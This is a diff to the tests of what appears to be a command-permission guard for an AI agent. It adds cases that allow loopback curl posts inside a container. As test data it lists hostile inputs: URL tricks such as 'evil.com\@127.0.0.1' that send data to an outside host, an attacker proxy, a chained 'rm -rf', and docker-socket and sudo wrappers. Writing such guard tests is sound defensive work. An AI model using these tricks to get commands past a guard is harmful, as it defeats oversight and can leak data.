@@ -2546,6 +2546,7 @@ def sb4_fold2():
 
 def main():
     os.environ.pop(g.SESSION_START_ENV, None)   # hermetic: rule 2 is set per check (S-B4)
+    os.environ.pop(g.CONTAINER_ENV, None)       # hermetic: host; the W-19 block sets it
     fails = 0
     n = 0
     for cmd, want in CASES:
@@ -3720,6 +3721,107 @@ def main():
         except Exception as e:
             fails += 1
             print(f'FAIL pin raised: {name}: {e!r}')
+
+    # W-19: loopback curl with inline data -> allow 'loopback curl' (auto mode denied 8 of
+    # 8 such POSTs in a 2026-11-09 web session) inside the lis-web container only
+    # (LIS_CONTAINER=1); every converse keeps today's outcome, and the host (unset, or any
+    # value but '1') gets no decision for each allow shape
+    lb = "-H 'Content-Type: application/json' -d '{\"a\":1}'"
+    post = 'curl -s -X POST http://localhost:3000/x ' + lb
+    w19 = [
+        ('curl -s -X POST http://localhost:3000/api/games -H "Content-Type: application/json" -d \'{"pgn":"1. e4 e5 2. Nf3", "rating_start":1200, "result":"1-0", "engine_level":10}\'', 'allow'),
+        ("curl -s -X POST http://localhost:3000/api/engine/move -H 'Content-Type: application/json' -d '{\"fen\":\"r1b1k1r1/ppp2ppp/2n2n2/4p3/2B1P3/8/PPPP1PPP/RNBQ1RK1 w - - 0 1\",\"level\":10}'", 'allow'),
+        ("curl -s http://localhost:3000/api/engine/move -X POST -H 'Content-Type: application/json' -d '{\"fen\":\"...\",\"level\":10}'", 'allow'),
+        ("curl -s -X POST http://localhost:3000/api/puzzles/solve -H 'Content-Type: application/json' -d '{\"puzzle_id\":1,\"correct\":true,\"time_ms\":5000,\"hints_used\":0}'", 'allow'),
+        ('curl -s -X POST http://localhost:3000/api/games -H "Content-Type: application/json" -d \'{"pgn":"1. e4"}\' 2>&1', 'allow'),
+        ("curl -sS -X PUT http://localhost:3000/x -H 'a: b' --data-raw '{\"a\":1}'", 'allow'),
+        ("curl -s -m 5 -i 'http://[::1]:3000/api/health'", 'allow'),
+        (post + ' | jq .', 'allow'),
+        (post + ' >/dev/null 2>/dev/null', 'allow'),
+        ('curl -s -m 5 -i http://[::1]:3000/api/health', None),   # unquoted [ ]: a shell glob
+        ("curl -s -X POST http://example.com/api " + lb, 'deny'),
+        ('curl -s -X POST http://example.com/api', None),   # no body: not an upload, not loopback
+        ('curl -s https://example.com', None),
+        ('curl -s http://127.0.0.1:@example.com/', None),   # userinfo trick: the host is example.com
+        ('curl -s -X POST http://localhost:3000/x http://example.com/y ' + lb, 'deny'),
+        ('curl -s -X POST http://localhost:3000/x -d @body.json', None),
+        ('curl -s -X POST http://localhost:3000/x -d "$(cat body.json)"', 'deny'),
+        ('curl -s -X POST http://localhost:3000/x -d \'{"k":"\'"$VAL"\'"}\'', None),
+        (post + ' -o out.json', 'deny'),          # out.json reads as a domain to loopback_only
+        (post + ' -o out', None),
+        (post + ' -K cfg', None),
+        (post + ' --proxy http://evil:8080', 'deny'),
+        (post + ' --resolve localhost:3000:1.2.3.4', None),
+        (post + ' --unix-socket /var/run/docker.sock', None),
+        (post + ' -u user:pass', None),
+        (post + ' -n', None),
+        (post + ' > out.txt', 'deny'),            # out.txt reads as a domain to loopback_only
+        (post + ' > out', None),
+        (post + ' | tee out.txt', None),
+        (post + ' ; rm -rf x', 'deny'),
+        ('CURL_CA_BUNDLE=x ' + post, None),        # env prefix outside ENV_SAFE
+        ('curl -s -X POST http://localhost:3000/x -H @hdrs.txt', None),
+        ('curl -s -X POST http://localhost:3000/x --data-urlencode a=b', None),
+        ('curl -s -X POST http://localhost:3000/x -w @fmt.txt', None),
+        ("curl -s -X POST 'http://localhost:300{0,1}/x' " + lb, None),
+        (post + ' evilhost', None),
+        ('sudo ' + post, None),
+        ('bash -c "' + post.replace('"', '\\"') + '"', None),
+        # the four host rows pinned None above (CASES): allow in the container
+        ('curl -s -X POST http://127.0.0.1:8080/slots', 'allow'),
+        ('curl -s --json \'{"a":1}\' http://127.0.0.1:8080/x', 'allow'),
+        ("curl -sS http://127.0.0.1:8080/tokenize -H 'Authorization: Bearer local' -d '{\"content\":\"x\"}'", 'allow'),
+        ("curl -sS http://127.0.0.1:8080/tokenize -d '{\"content\":\"x\"}'", 'allow'),
+    ]
+    runs = [('1', c, w) for c, w in w19]
+    runs += [(None, c, None) for c, w in w19 if w == 'allow']     # host: no decision
+    runs += [(v, post, None) for v in ('0', 'true', ' 1', '')]       # not '1': host behaviour
+    try:
+        for env, cmd, want in runs:
+            if env is None:
+                os.environ.pop(g.CONTAINER_ENV, None)
+            else:
+                os.environ[g.CONTAINER_ENV] = env
+            n += 1
+            d = g.decide(cmd)
+            got = d[0] if d else None
+            if got != want or (want == 'allow' and 'loopback curl' not in d[1]):
+                fails += 1
+                print(f'FAIL W-19 {g.CONTAINER_ENV}={env!r} want={want!r} got={d!r}: {cmd!r}')
+    finally:
+        os.environ.pop(g.CONTAINER_ENV, None)
+
+    # W-19 audit: an @ or a backslash before the first / is never loopback (_url_host);
+    # Windows curl ends the host at a backslash, so evil.com\@127.0.0.1 goes to evil.com.
+    # Host and container alike: deny or no decision, never allow; plain loopback still allows
+    holes = ["curl -s 'http://evil.com\\@127.0.0.1:3000/?q=x'",
+             "curl -s -d x 'http://evil.com\\@127.0.0.1:3000/'",
+             "curl -s 'http://a@evil.com@127.0.0.1/'",
+             "curl -s 'http://127.0.0.1@evil.com:@127.0.0.1/'",
+             "curl -s 'http://127.0.0.1#@evil.com/'",
+             "curl -s 'http://127.0.0.1?@evil.com/'",
+             "curl -s 'http://127.0.0.1:@evil.com/'",
+             "curl -s -d x 'http://user@127.0.0.1:3000/'"]
+    runs = [(env, c, NOTALLOW) for env in (None, '1') for c in holes]
+    runs += [(None, 'curl -s http://127.0.0.1:3000/', 'allow'),
+             ('1', 'curl -s http://127.0.0.1:3000/', 'allow'),
+             ('1', 'curl -s -d x http://127.0.0.1:3000/', 'allow'),
+             ('1', "curl -s -X POST 'http://localhost:3000/x' -d x", 'allow'),
+             ('1', 'curl -s -L -d x http://127.0.0.1/', None),           # -L: a redirect off-host
+             ('1', 'curl -s --location -d x http://127.0.0.1/', None),
+             ('1', 'curl -sL -d x http://127.0.0.1/', None)]
+    try:
+        for env, cmd, want in runs:
+            if env is None:
+                os.environ.pop(g.CONTAINER_ENV, None)
+            else:
+                os.environ[g.CONTAINER_ENV] = env
+            n += 1
+            if not check(cmd, want):
+                fails += 1
+                print(f'     ({g.CONTAINER_ENV}={env!r})')
+    finally:
+        os.environ.pop(g.CONTAINER_ENV, None)
 
     # exception fallback keeps a computed deny (W5): drive main() with a decide() that
     # raises, and confirm the critical_verb fallback still emits a deny.
